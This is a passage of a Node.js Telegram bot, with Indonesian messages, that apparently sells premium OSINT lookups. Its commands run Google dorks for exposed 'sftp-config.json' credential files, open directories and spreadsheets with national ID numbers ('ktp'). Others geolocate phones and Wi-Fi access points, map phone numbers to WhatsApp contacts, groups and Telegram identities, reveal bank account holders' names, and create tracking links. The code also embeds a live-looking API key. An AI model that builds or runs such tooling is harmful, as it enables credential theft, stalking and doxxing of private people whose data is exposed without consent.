          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/form":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /form pendaftaran");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:docs.google.com/forms/`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/gdoc":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /gdoc bab 1");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` site:docs.google.com/document/`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/gslide":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /gslide osint");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` site:docs.google.com/presentation/`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/ftp":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /ftp indo");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` intext:"Index of / " intext:sftp-config.json`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/ppt":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /ppt osint");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` filetype:ppt ext:ppt OR filetype:pptx ext:pptx`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/excel":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /excel no ktp");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` filetype:xls ext:xls OR filetype:xlsx ext:xlsx`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/doc":
      if (!query) return sendMessage(chatId, "Masukan Query Seperti: /bab 1");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + ` filetype:doc ext:doc OR filetype:docs ext:docs`
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/pdf":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /pdf hacking");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` filetype:pdf ext:pdf`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/drive":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /drive pelajar");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:drive.google.com`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/archive":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /archive whatsapp");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      // Panggil fungsi getArchiveInfo untuk mendapatkan informasi arsip dari Wayback Machine
      getArchiveInfo(query)
        .then((archiveInfo) => {
          // Tampilkan informasi arsip kepada pengguna
          const archiveUrl = archiveInfo.url;
          const timestamp = archiveInfo.timestamp;
          const status = archiveInfo.status;

          const formattedTime = moment(timestamp, "YYYYMMDDHHmmss").format(
            "YYYY-MM-DD HH:mm:ss"
          );

          sendMessage(
            chatId,
            `Archive URL: ${archiveUrl}\nTimestamp: ${formattedTime}\nStatus: ${status}`
          );
        })
        .catch((error) => {
          sendMessage(chatId, `Error: ${error.message}`);
        });
      break;

    case "/exe":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /exe whatsapp");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` filetype:exe ext:exe`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/apk":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /apk whatsapp");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` filetype:apk ext:apk`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/anonfile":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /anonfile hack");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` site:anonfiles.com`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/dir":
      if (!query) return sendMessage(chatId, "Masukan Query Seperti: /dir ktp");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + ` intitle:"index of /"`);
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/sosmed":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /sosmed jokowi");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query +
            " site:twitter.com OR site:facebook.com OR site:instagram.com OR site:linkedin.com OR site:snapchat.com OR site:youtube.com OR site:tiktok.com OR site:pinterest.com"
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/blogspot":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /blogspot delta");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + " site:www.blogger.com/profile/"
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/telepriv":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /telepriv hacker");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + " site:t.me/+ OR site:t.me/join OR site:t.me/joinchat"
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/tele":
      if (!query)
        return sendMessage(chatId, "Masukan Query Seperti: /tele hacker");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(query + " site:t.me/");
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/github":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Query Seperti: /gitub bot telegram"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      try {
        const results = await googleIt(
          query + " site:raw.githubusercontent.com/"
        );
        let response = "";
        if (results.length > 0) {
          response = "Here are the search results:\n\n";
          results.slice(0, 5).forEach((result, index) => {
            response +=
              `<b>${index + 1}.</b> <a href="${result.url}">${
                result.title
              }</a>\n` +
              `<b>Header:</b> ${result.header}\n` +
              `<b>Description:</b> ${result.description}\n\n`;
          });
        } else {
          response = "No results found for your query.";
        }

        sendMessage(chatId, response, {
          parse_mode: "HTML",
          disable_web_page_preview: true,
        });
      } catch (err) {
        sendMessage(
          chatId,
          "Error occurred while searching. Please try again later."
        );
      }
      break;
    case "/track":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Judul Seperti: /track seorang pria mendapat 1 miliar dalam 1 hari"
        );
      if (!isPremium)
        return sendMessage(
          msg.chat.id,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      createLink(msg, query);
      break;
    case "/result":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Judul Seperti: /result seorang-pria-mendapat-1-miliar-dalam-1-hari"
        );
      if (!isPremium)
        return sendMessage(
          msg.chat.id,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      getResult(msg, query);
      break;
    case "/bts":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan BTS ID Seperti: /bts MCC-MNC-LAC-CID"
        );
      if (!isPremium)
        return sendMessage(
          msg.chat.id,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      const btsInfo = query.split("-");
      const mcc = btsInfo[0];
      const mnc = btsInfo[1];
      const lac = btsInfo[2];
      const cid = btsInfo[3];

      // Membuat permintaan ke API dengan parameter yang diberikan
      axios
        .get(`https://rasitechchannel.my.id/api/btss.php`, {
          params: {
            mcc: mcc,
            mnc: mnc,
            lac: lac,
            cid: cid,
          },
        })
        .then((response) => {
          const data = response.data;

          // Membuat pesan dengan informasi lokasi yang diterima dari API
          const message = `🛰️ *Result* 🛰️\n++++++++++\n\n*Akurasi:* ${data.accuracy}m\n\n*Latitude:* ${data.latitude}\n*Longitude:* ${data.longitude}\n*Alamat:* ${data.address}\n\n*Lokasi di Google Maps:* ${data.maps}\n\n*Note : Harap Gunakan Dengan Bijak !!! -9.9-*`;

          // Mengirimkan pesan ke pengguna
          sendMessage(chatId, message, { parse_mode: "Markdown" });
          // bot.sendPhoto(chatId, "https://i.imgur.com/4krqWlN.png", {caption: `<b>History Satelit</b>\n\n<a href="https://livingatlas.arcgis.com/wayback/#localChangesOnly=true&ext=${data.longitude},${data.latitude},${data.longitude},${data.latitude}">Arcgis</a> - <a href="https://earthengine.google.com/timelapse/#v=${data.latitude},${data.longitude},15,latLng&t=3.04">EarthEngine</a> - <a href="https://apps.sentinel-hub.com/sentinel-playground/?source=S2L2A&lat=${data.latitude}&lng=${data.longitude}">Sentinel</a>`, parse_mode: "HTML",});
          bot.sendLocation(chatId, data.latitude, data.longitude, {
            caption: "Maps Location",
          });
        })
        .catch((error) => {
          console.log(error);
          bot.sendMessage(
            chatId,
            "Maaf, terjadi kesalahan saat memproses permintaan Anda."
          );
        });
      break;
    case "/telegram":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Query Seperti: /telegram Phone/Device/IP/ID/Username/Nama"
        );
      try {
        const apiUrl = `https://rasitechchannel.my.id/teleuser/api/?search=${query}`;
        const response = await axios.get(apiUrl);

        if (response.status === 200) {
          const results = response.data;
          const randomResults = getRandomResults(results, 6);

          if (randomResults.length > 0) {
            let resultMessage = "Hasil pencarian:\n";
            randomResults.forEach((result) => {
              const fullName = getFullName(result);
              resultMessage += `ID: ${result.id}\n`;
              resultMessage += `Nama: ${fullName}\n`;
              if (result.username) {
                resultMessage += `Username: @******\n`;
              }
              if (result.phone_number) {
                resultMessage += `Nomor Telepon: @TeleScanCreatorBot / @tgcheck_robot\n`;
              }
              resultMessage += "\n";
            });
            sendMessage(chatId, resultMessage);
          } else {
            sendMessage(chatId, "Tidak ada hasil ditemukan.");
          }
        } else {
          sendMessage(chatId, "Terjadi kesalahan saat memproses permintaan.");
        }
      } catch (error) {
        sendMessage(chatId, "Terjadi kesalahan saat memproses permintaan.");
      }
      break;
    case "/scanwa":
      if (!query)
        return sendMessage(chatId, "Masukan Nomor Seperti: /scanwa 62XXXXXXX");
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      async function getData() {
        try {
          const response = await axios.get(
            `https://rasitechchannel.my.id/scanwa/?no=${query}`
          );
          const data = response.data;

          const contactNames = data.map((item) => item.contact_name);
          const groupNames = data.map((item) => item.group_name);

          return { contactNames, groupNames };
        } catch (error) {
          console.error("Error fetching data:", error);
          throw error;
        }
      }

      // Memanggil fungsi untuk mendapatkan data dan menyimpannya ke dalam variabel.
      async function main() {
        try {
          const { contactNames, groupNames } = await getData();

          let hasil = "";
          contactNames.forEach((name, index) => {
            const displayIndex = index + 1;
            hasil += `\nNama ${displayIndex}: ${name ? name : "N/A"}\n`;

            hasil += "List Group:\n";
            if (groupNames[index].length > 0) {
              groupNames[index].forEach((group, groupIndex) => {
                hasil += `${groupIndex + 1}. ${group}\n`;
              });
            } else {
              hasil += "No group name available.\n";
            }
          });

          if (!hasil)
            return sendMessage(
              chatId,
              `Nomor WhatsApp tidak terdaftar dalam database kami!`
            );

          sendMessage(chatId, hasil); // Menampilkan hasil ke konsol
        } catch (error) {
          console.error("Error:", error);
        }
      }

      main();

      break;
    case "/lang":
      sendMessage(
        chatId,
        "Selamat datang di bot bahasa!\nSilakan pilih bahasa yang ingin Anda gunakan:",
        {
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🇮🇩 Bahasa Indonesia", callback_data: "indonesia" },
                { text: "🇺🇸 English", callback_data: "english" },
                { text: "🇷🇺 Russian", callback_data: "russian" },
              ],
            ],
          },
        }
      );
      sendMessage(chatId, "Kamu memilih: " + languageConfig[chatId]);
      break;
    case "/searchno":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan Nomor Seperti: /searchno 62XXXXXXX"
        );
      let format1 =
        query.substring(0, 2) +
        " " +
        query.substring(2, 5) +
        " " +
        query.substring(5, 9) +
        " " +
        query.substring(9);
      // console.log(format1);
      let format2 =
        query.substring(0, 2) +
        " " +
        query.substring(2, 5) +
        "-" +
        query.substring(5, 9) +
        "-" +
        query.substring(9);
      // console.log(format2);
      let format3 =
        "+" +
        query.substring(0, 2) +
        " " +
        query.substring(2, 5) +
        "-" +
        query.substring(5, 9) +
        "-" +
        query.substring(9);
      // console.log(format3);
      let format4 = query.substring(2);
      // console.log(format4);
      let format5 =
        format4.substring(0, 3) +
        " " +
        format4.substring(3, 7) +
        " " +
        format4.substring(7);
      // console.log(format5);
      let format6 =
        format4.substring(0, 3) +
        "-" +
        format4.substring(3, 7) +
        "-" +
        format4.substring(7);
      // console.log(format6);
      let format7 =
        query.substring(0, 2) +
        " " +
        query.substring(2, 5) +
        "-" +
        query.substring(5, 9) +
        "-" +
        query.substring(9);
      // console.log(format7);
      let format8 = query.substring(2);
      // console.log(0 + format8);
      let format9 =
        format4.substring(0, 3) +
        " " +
        format4.substring(3, 7) +
        " " +
        format4.substring(7);
      // console.log(0 + format9);
      let format0 =
        format4.substring(0, 3) +
        "-" +
        format4.substring(3, 7) +
        "-" +
        format4.substring(7);
      // console.log(0 + format0);
      const re = `intext%3A%22${query}%22%20OR%20intext%3A%22%2B${query}%22%20OR%20intext%3A%22${format1}%22%20OR%20intext%3A%22${format2}%22%20OR%20intext%3A%22${format3}%22%20OR%20intext%3A%22${format4}%22%20OR%20intext%3A%22${format5}%22%20OR%20intext%3A%22${format6}%22%20OR%20intext%3A%22%2B${format7}%22%20OR%20intext%3A%220${format8}%22%20OR%20intext%3A%220${format9}%22%20OR%20intext%3A%220${format0}%22`;
      const viber = `https://transitapp.com/redirect.html?url=viber://chat?number=${query}`;
      const whatsapp = `https://transitapp.com/redirect.html?url=whatsapp://send/?phone=${query}`;
      const telegram = `http://t.me/+${query}`;
      sendMessage(
        chatId,
        "Berikut adalah hasil pencarian kontak sosmed\nManual cek",
        {
          reply_markup: {
            inline_keyboard: [
              [
                { text: "🟣 Viber", url: viber },
                { text: "🟢 WhatsApp", url: whatsapp },
                { text: "🔵 Telegram", url: telegram },
              ],
              [
                {
                  text: "⚪️ Google Search",
                  url: "https://www.google.com/search?q=" + re,
                },
              ],
            ],
          },
        }
      );
      break;
    case "/status":
      let hostname = os.hostname();
      let uptime = os.uptime();
      let loadavg = os.loadavg();
      let totalmem = os.totalmem();
      let freemem = os.freemem();
      let totalmemGB = (totalmem / Math.pow(1024, 3)).toFixed(2);
      let freememGB = (freemem / Math.pow(1024, 3)).toFixed(2);
      ping.promise.probe("google.com").then(function (res) {
        let pingTime = res.time;
        let message = `Hostname: ${hostname}\nUptime: ${uptime} seconds\nLoad Average: ${loadavg}\nTotal Memory: ${totalmemGB} GB\nFree Memory: ${freememGB} GB\nPing: ${pingTime} ms\nCommand Counter: ${commandCounter}\n`;
        fs.readFile("premium.json", "utf8", function (err, data) {
          if (err) throw err;
          let list = JSON.parse(data);
          message += `Premium User: ${list.length}\n`;
          sendMessage(msg.chat.id, message);
        });
      });
      break;
    case "/bssid":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan BSSID Seperti: /bssid 00:0C:42:1F:65:E9"
        );
      if (!isPremium)
        return sendMessage(
          chatId,
          "Fitur ini hanya untuk pengguna premium!\n\nKontak @rasirt2"
        );
      sendMessage(chatId, "Oke, Prosess!");
      axios
        .get(
          `https://api.mylnikov.org/geolocation/wifi?v=1.1&data=open&bssid=${resp}`
        )
        .then((response) => {
          const locationData = response.data;
          if (locationData.result) {
            let message = `Latitude: ${locationData.data.lat}\nLongitude: ${locationData.data.lon}\n`;
            message += `Accuracy: ${locationData.data.range}m`;
            sendMessage(
              chatId,
              "++++++++ [BSSID TRACKER] +++++++\n\n" + message
            );
          } else {
            sendMessage(chatId, "Terjadi masalah, data tidak ditemukan");
          }
        })
        .catch(() => {
          sendMessage(chatId, "Terjadi kesalahan saat mengambil data");
        });
      break;
    case "/userid":
      if (!query)
        return sendMessage(
          chatId,
          "Masukan ID Telegram Bot Seperti: /userid 123456789"
        );
      const userId = query;
      bot
        .getChat(userId)
        .then((users) => {
          bot
            .getUserProfilePhotos(userId)
            .then((user) => {
              console.log(user);
              const name = users.first_name;
              const username = users.username || "Tidak Ada";
              const bio = users.bio || "Tidak Ada";
              if (user.photos.length > 0) {
                bot.sendPhoto(chatId, user.photos[0][0].file_id, {
                  caption: `Nama: ${name}\nUsername: @${username}\nBio: ${bio}\nUser ID: ${userId}`,
                });
              } else {
                sendMessage(
                  chatId,
                  `Nama: ${name}\nUsername: @${username}\nBio: ${bio}\nUser ID: ${userId}`
                );
              }
            })
            .catch((err) => {
              sendMessage(chatId, "Error: " + err);
            });
        })
        .catch((err) => {
          sendMessage(chatId, "Error: " + err);
        });
      break;
    case "/ip":
      if (!query)
        return sendMessage(chatId, "Masukan IP Address Seperti: /ip 8.8.8.8");
      const options = {
        headers: {
          "User-Agent": "nodejs-ipapi-v1.02",
        },
        json: true,
      };

      const url = `https://ipapi.co/${query}/json/`;

      axios
        .get(url, options)
        .then((response) => {
          const data = response.data;
          let text = "";
          for (const key in data) {
            text += `${key}: ${data[key]}\n`;
          }
          console.log(text);
          sendMessage(chatId, "++++++++ [IP LOOKUP] +++++++\n\n" + text);
        })
        .catch((error) => {
          console.log(error);
          sendMessage(chatId, "++++++++ [ERROR] +++++++\n\nTerjadi Kesalahan!");
        });
      // send back the matched "whatever" to the chat
      break;
    case "/bank":
      const headers = {
        authority: "cekrekening.id",
        accept: "application/json, text/plain, */*",
        "accept-language": "en-US,en;q=0.9,id;q=0.8",
        "cache-control": "no-cache",
        dnt: "1",
        pragma: "no-cache",
        referer: "https://cekrekening.id/home-card",
        "sec-ch-ua":
          '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "user-agent":
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
      };

      const resp = query.split("|"); // the captured "whatever"
      // sendMessage(msg.chat.id, resp[0])
      // sendMessage(msg.chat.id, resp[1])
      if (!resp[0])
        return sendMessage(
          msg.chat.id,
          "Masukan /bank NOREK|BANKNAME : /bank NOREK|BRI"
        );
      if (!resp[1])
        return sendMessage(
          msg.chat.id,
          "Masukan /bank NOREK|BANKNAME : /bank NOREK|BRI"
        );
      const input = query.toUpperCase();
      const target = input.split("|")[0];
      const bankCode = input.split("|")[1];
      axios
        .get(
          `https://toolcek.my.id/api?api_key=DMlPLTIEpLazu1AFSgsCrlt2zLs99kOBQTFQQlmdPAnYqlA5UcfIC08RmDSnM6iabn8qhf93YKGjBAylaRIlGNbEZIlrtAYYFYhH&type=ERP&erp_type=R&erp_code=${bankCode}&erp_target=${target}`
        )
        .then((response) => {
          const data = response.data;
          if (data.result) {
            sendMessage(chatId, `Server 2\nNama : ${data.data.name}`);
          } else {
            sendMessage(chatId, `Error: ${data.msg}`);
          }
        })
        .catch((error) => {
          sendMessage(
            chatId,
            "Terjadi kesalahan saat mengambil data, silakan coba lagi"
          );
        });
      sendMessage(chatId, "Oke, Prosess!");
      axios
        .get("https://cekrekening.id/master/bank?enablePage=0", {
          headers: headers,
        })
        .then((response) => {
          if (response.data.status) {
            const bank = response.data.data.content.find((bank) =>
              bank.bankName.toLowerCase().includes(`${resp[1].toLowerCase()}`)
            );
            if (bank) {
              sendMessage(
                msg.chat.id,
